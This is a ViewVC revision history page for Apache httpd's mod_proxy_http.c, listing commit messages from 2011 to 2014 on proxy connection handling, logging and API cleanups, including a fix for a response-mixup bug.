([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1570598&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1570598))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1570598)

Modified
*Fri Feb 21 15:08:32 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 82427 byte(s)

Diff to [previous 1568404](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1568404&r2=1570598)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1568404&r2=1570598&diff_format=h))
```
Log an error in mod_proxy_http when reading the request body fails.
Follow-up to [r1538776](/viewvc?view=revision&revision=1538776) where incomplete bodies are detected and an error returned through the input filters.

```

---

Revision [**1568404**](/viewvc?view=revision&revision=1568404) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1568404&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1568404&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1568404))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1568404)

Modified
*Fri Feb 14 17:55:19 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 81278 byte(s)

Diff to [previous 1550061](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1550061&r2=1568404)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1550061&r2=1568404&diff_format=h))
```
mod_proxy_http: don't recycle backend connections known to be closed (eg. EOS by close).
This saves a useless ap_is_socket_connected() call when reused.

```

---

Revision [**1550061**](/viewvc?view=revision&revision=1550061) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1550061&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1550061&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1550061))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1550061)

Modified
*Wed Dec 11 07:27:12 2013 UTC*
(11 years, 1 month ago)
by *jkaluza*

File length: 81234 byte(s)

Diff to [previous 1542562](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1542562&r2=1550061)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1542562&r2=1550061&diff_format=h))
```
Cleanup the bb brigade, because buckets inserted to it can be created from
scpool and this pool can be freed before this brigade.
POSSIBLE (but as yet unconfirmed) fix for crashes seen with threaded servers,
e.g. PR 50335.

```

---

Revision [**1542562**](/viewvc?view=revision&revision=1542562) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1542562&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1542562&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1542562))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1542562)

Modified
*Sat Nov 16 20:13:48 2013 UTC*
(11 years, 2 months ago)
by *jim*

File length: 81048 byte(s)

Diff to [previous 1534321](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1534321&r2=1542562)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1534321&r2=1542562&diff_format=h))
```
We were not being consistent between http and others
if we added the default port or not during the canonizing
phase... Baseline the http method (don't add unless the
port provided isn't the default).

```

---

Revision [**1534321**](/viewvc?view=revision&revision=1534321) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1534321&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1534321&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1534321))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1534321)

Modified
*Mon Oct 21 18:58:26 2013 UTC*
(11 years, 3 months ago)
by *jorton*

File length: 81061 byte(s)

Diff to [previous 1530603](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1530603&r2=1534321)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1530603&r2=1534321&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (ap_proxy_http_request): Use the same
  brigade lifetime for the header brigade as the other brigades.
  POSSIBLE (but as yet unconfirmed) fix for crashes seen with threaded
  servers, e.g. PR 50335; appears correct or at least not harmful.

PR: 50335

```

---

Revision [**1530603**](/viewvc?view=revision&revision=1530603) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1530603&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1530603&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1530603))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1530603)

Modified
*Wed Oct 9 13:38:45 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 81069 byte(s)

Diff to [previous 1524018](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1524018&r2=1530603)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1524018&r2=1530603&diff_format=h))
```
ping tuning via Yann Ylavic <ylavic.dev@gmail.com>

```

---

Revision [**1524018**](/viewvc?view=revision&revision=1524018) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1524018&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1524018&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1524018))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1524018)

Modified
*Tue Sep 17 12:51:08 2013 UTC*
(11 years, 4 months ago)
by *trawick*

File length: 80714 byte(s)

Diff to [previous 1517045](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1517045&r2=1524018)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1517045&r2=1524018&diff_format=h))
```
fill in missing message numbers in APLOGNO() invocations

```

---

Revision [**1517045**](/viewvc?view=revision&revision=1517045) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1517045&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1517045&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1517045))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1517045)

Modified
*Fri Aug 23 21:19:21 2013 UTC*
(11 years, 5 months ago)
by *jailletc36*

File length: 80709 byte(s)

Diff to [previous 1516930](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1516930&r2=1517045)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1516930&r2=1517045&diff_format=h))
```
Save a few cycles

```

---

Revision [**1516930**](/viewvc?view=revision&revision=1516930) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1516930&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1516930&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1516930))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1516930)

Modified
*Fri Aug 23 16:48:42 2013 UTC*
(11 years, 5 months ago)
by *jim*

File length: 80707 byte(s)

Diff to [previous 1483027](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1483027&r2=1516930)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1483027&r2=1516930&diff_format=h))
```
Allow for a simple socket check in addition to the
higher level protocol-level checks for backends...

Not sure if it makes sense to do both or not... Comments?

```

---

Revision [**1483027**](/viewvc?view=revision&revision=1483027) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1483027&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1483027&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1483027))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1483027)

Modified
*Wed May 15 19:27:10 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 80154 byte(s)

Diff to [previous 1482522](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1482522&r2=1483027)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1482522&r2=1483027&diff_format=h))
```
mod_proxy_http: Make the proxy-interim-response environment variable
effective by formally overriding origin server behaviour.

```

---

Revision [**1482522**](/viewvc?view=revision&revision=1482522) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1482522&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1482522&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1482522))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1482522)

Modified
*Tue May 14 18:58:06 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 79975 byte(s)

Diff to [previous 1482075](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1482075&r2=1482522)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1482075&r2=1482522&diff_format=h))
```
core: Stop the HTTP_IN filter from attempting to write error buckets
to the output filters, which is bogus in the proxy case. Create a
clean mapping from APR codes to HTTP status codes, and use it where
needed.

```

---

Revision [**1482075**](/viewvc?view=revision&revision=1482075) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1482075&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1482075&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1482075))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1482075)

Modified
*Mon May 13 20:11:36 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 80104 byte(s)

Diff to [previous 1480058](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1480058&r2=1482075)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1480058&r2=1482075&diff_format=h))
```
mod_proxy, mod_proxy_http: Connection headers must be stripped on the way
in and out, support an optional function to handle this.

```

---

Revision [**1480058**](/viewvc?view=revision&revision=1480058) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1480058&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1480058&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1480058))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1480058)

Modified
*Tue May 7 20:27:37 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 80142 byte(s)

Diff to [previous 1465839](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1465839&r2=1480058)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1465839&r2=1480058&diff_format=h))
```
mod_proxy: Ensure network errors detected by the proxy are returned as
504 Gateway Timout as opposed to 502 Bad Gateway, in order to be
compliant with RFC2616 14.9.4 Cache Revalidation and Reload Controls.

[Reverted by [r1884280](/viewvc?view=revision&revision=1884280)]

```

---

Revision [**1465839**](/viewvc?view=revision&revision=1465839) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1465839&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1465839&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1465839))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1465839)

Modified
*Tue Apr 9 00:18:42 2013 UTC*
(11 years, 9 months ago)
by *druggeri*

File length: 80137 byte(s)

Diff to [previous 1456124](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1456124&r2=1465839)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1456124&r2=1465839&diff_format=h))
```
Add failontimeout to allow server admin to mark balancer member in err if IO timeout occurs.

```

---

Revision [**1456124**](/viewvc?view=revision&revision=1456124) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1456124&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1456124&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1456124))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1456124)

Modified
*Wed Mar 13 20:39:34 2013 UTC*
(11 years, 10 months ago)
by *trawick*

File length: 80073 byte(s)

Diff to [previous 1453875](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1453875&r2=1456124)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1453875&r2=1456124&diff_format=h))
```
axe unused variable dconf (since [r1453875](/viewvc?view=revision&revision=1453875))

```

---

Revision [**1453875**](/viewvc?view=revision&revision=1453875) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1453875&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1453875&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1453875))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1453875)

Modified
*Thu Mar 7 14:06:51 2013 UTC*
(11 years, 10 months ago)
by *jim*

File length: 80169 byte(s)

Diff to [previous 1433988](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1433988&r2=1453875)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1433988&r2=1453875&diff_format=h))
```
Pull out duplicated code to proxy_util...

```

---

Revision [**1433988**](/viewvc?view=revision&revision=1433988) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1433988&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1433988&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1433988))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1433988)

Modified
*Wed Jan 16 15:37:16 2013 UTC*
(12 years ago)
by *rpluem*

File length: 91202 byte(s)

Diff to [previous 1373955](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1373955&r2=1433988)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1373955&r2=1433988&diff_format=h))
```
* A limit of zero means unlimited for LimitRequestBody.

PR: 54435
Submitted by: Pavel Mateja <pavel netsafe.cz>
Reviewed by: rpluem

```

---

Revision [**1373955**](/viewvc?view=revision&revision=1373955) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1373955&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1373955&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1373955))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1373955)

Modified
*Thu Aug 16 17:54:50 2012 UTC*
(12 years, 5 months ago)
by *rjung*

File length: 91191 byte(s)

Diff to [previous 1333969](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1333969&r2=1373955)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1333969&r2=1373955&diff_format=h))
```
Fix closing the back end connection in case of error.
The field "closed" was changed from an int to a bit
field of size one in 2.4.x.
For historical reasons a close instruction was coded
as an increment on the field, which in 2.4.x flips
the field each time. There were mutliple code paths
that would flip it several times for a single error,
so effectively the connection was no longer closed
in these cases.

Especially in the case of an aborted client connection
this lead to a non consumed back end buffer and thus to
response mixup between users.

PR 53727

CVE-2012-3052

```

---

Revision [**1333969**](/viewvc?view=revision&revision=1333969) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1333969&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1333969&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1333969))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1333969)

Modified
*Fri May 4 14:02:58 2012 UTC*
(12 years, 8 months ago)
by *rpluem*

File length: 91155 byte(s)

Diff to [previous 1242798](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1242798&r2=1333969)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1242798&r2=1333969&diff_format=h))
```
* Use the the same hostname for SNI as for the HTTP request when forwarding
  to SSL backends.

PR: 53134
Based on a patch from: Michael Weiser <michael weiser.dinsnail.net>
Reviewed by: rpluem

```

---

Revision [**1242798**](/viewvc?view=revision&revision=1242798) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1242798&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1242798&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1242798))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1242798)

Modified
*Fri Feb 10 14:52:25 2012 UTC*
(12 years, 11 months ago)
by *jorton*

File length: 90533 byte(s)

Diff to [previous 1214015](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1214015&r2=1242798)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1214015&r2=1242798&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response):
  Treat EAGAIN as an error for a blocking read from the input filter
  stack.

```

---

Revision [**1214015**](/viewvc?view=revision&revision=1214015) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1214015&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1214015&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1214015))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1214015)

Modified
*Wed Dec 14 01:10:52 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 90474 byte(s)

Diff to [previous 1214003](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1214003&r2=1214015)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1214003&r2=1214015&diff_format=h))
```
Further clarify the naming of the entity that directly connects to us by
calling that entity a client instead of a peer.

```

---

Revision [**1214003**](/viewvc?view=revision&revision=1214003) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1214003&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1214003&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1214003))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1214003)

Modified
*Wed Dec 14 00:31:51 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 90460 byte(s)

Diff to [previous 1209916](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209916&r2=1214003)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209916&r2=1214003&diff_format=h))
```
Further clarify the naming of the entity that originates the request by
calling that entity a useragent instead of a client.

```

---

Revision [**1209916**](/viewvc?view=revision&revision=1209916) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209916&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209916&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1209916))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1209916)

Modified
*Sat Dec 3 14:39:51 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 90451 byte(s)

Diff to [previous 1209812](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209812&r2=1209916)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209812&r2=1209916&diff_format=h))
```
mod_proxy: Remove ap_proxy_make_fake_req() from the public API.

```

---

Revision [**1209812**](/viewvc?view=revision&revision=1209812) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209812&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209812&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1209812))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1209812)

Modified
*Sat Dec 3 01:03:08 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 89425 byte(s)

Diff to [previous 1209811](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209811&r2=1209812)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209811&r2=1209812&diff_format=h))
```
mod_proxy: Remove ap_proxy_date_canon() from the public API.

```

---

Revision [**1209811**](/viewvc?view=revision&revision=1209811) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209811&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209811&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1209811))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1209811)

Modified
*Sat Dec 3 00:57:19 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 88958 byte(s)

Diff to [previous 1209797](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209797&r2=1209811)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209797&r2=1209811&diff_format=h))
```
mod_proxy: Remove ap_proxy_buckets_lifetime_transform() from the public API.

```

---

Revision [**1209797**](/viewvc?view=revision&revision=1209797) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209797&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209797&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1209797))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1209797)

Modified
*Sat Dec 3 00:30:06 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 87205 byte(s)

Diff to [previous 1209766](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209766&r2=1209797)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1209766&r2=1209797&diff_format=h))
```
mod_proxy: Remove ap_proxy_liststr(), it duplicates ap_find_token().

```

---

Revision [**1209766**](/viewvc?view=revision&revision=1209766) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209766&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1209766&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1209766))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1209766)

Modified
*Fri Dec 2 23:02:04 2011 UTC*
(13 years, 1 month ago)
by *sf*

File length: 87292 byte(s)

Diff to [previous 1206291](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1206291&r2=1209766)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1206291&r2=1209766&diff_format=h))
```
Add lots of unique tags to error log messages

```

---

Revision [**1206291**](/viewvc?view=revision&revision=1206291) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1206291&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1206291&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1206291))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1206291)

Modified
*Fri Nov 25 19:42:04 2011 UTC*
(13 years, 2 months ago)
by *minfrin*

File length: 86797 byte(s)

Diff to [previous 1204968](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1204968&r2=1206291)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1204968&r2=1206291&diff_format=h))
```
Introduce a per connection "peer_ip" and a per request "client_ip" to
distinguish between the raw IP address of the connection and the effective
IP address of the request.

```

---

Revision [**1204968**](/viewvc?view=revision&revision=1204968) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1204968&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1204968&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1204968))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1204968)

Modified
*Tue Nov 22 13:10:39 2011 UTC*
(13 years, 2 months ago)
by *minfrin*

File length: 86807 byte(s)

Diff to [previous 1203859](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1203859&r2=1204968)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1203859&r2=1204968&diff_format=h))
```
Introduce a per request version of the remote IP address, which can be
optionally modified by a module when the effective IP of the client
is not the same as the real IP of the client (such as a load balancer).

```

---

Revision [**1203859**](/viewvc?view=revision&revision=1203859) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1203859&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1203859&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1203859))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1203859)

Modified
*Fri Nov 18 21:41:09 2011 UTC*
(13 years, 2 months ago)
by *sf*

File length: 86807 byte(s)

Diff to [previous 1174751](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1174751&r2=1203859)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1174751&r2=1203859&diff_format=h))
```
great proxy logging cleanup:

  * remove "proxy:", "FCGI", etc. prefixes and pid which are now
    included in the error log format

  * propagate frontend request's logconfig to backend request

  * use ap_log_rerror where possible

  * remove obsolete APLOG_NOERRNO

```

---

Revision [**1174751**](/viewvc?view=revision&revision=1174751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1174751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1174751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1174751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1174751)

Modified
*Fri Sep 23 13:39:32 2011 UTC*
(13 years, 4 months ago)
by *jim*

File length: 87508 byte(s)

Diff to [previous 1154342](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1154342&r2=1174751)
